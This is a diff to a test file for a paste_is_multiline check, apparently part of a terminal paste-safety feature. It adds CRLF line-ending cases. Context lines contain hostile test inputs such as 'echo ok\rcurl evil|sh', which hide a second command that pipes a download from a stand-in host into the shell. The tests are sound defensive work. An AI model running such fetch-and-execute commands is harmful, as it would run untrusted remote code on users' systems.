@@ -617,6 +617,10 @@ eq(S.paste_is_multiline('ls'), False, 'multiline: a single line is not multi-lin
 eq(S.paste_is_multiline('ls\n'), False,
    'multiline: a single line with a trailing newline is one command, not multi-line')
 eq(S.paste_is_multiline('a\nb'), True, 'multiline: two lines are multi-line')
+eq(S.paste_is_multiline('ls\r\n'), False,
+   'multiline: a single line with a trailing CRLF is one command, not multi-line')
+eq(S.paste_is_multiline('a\r\nb'), True,
+   'multiline: two CRLF-separated lines are multi-line')
 eq(S.paste_is_multiline('echo ok\rcurl evil|sh'), True,
    'multiline: an interior carriage return (which the shell runs) is multi-line')
 eq(S.paste_is_multiline('echo ok\ncurl evil|sh\n'), True,
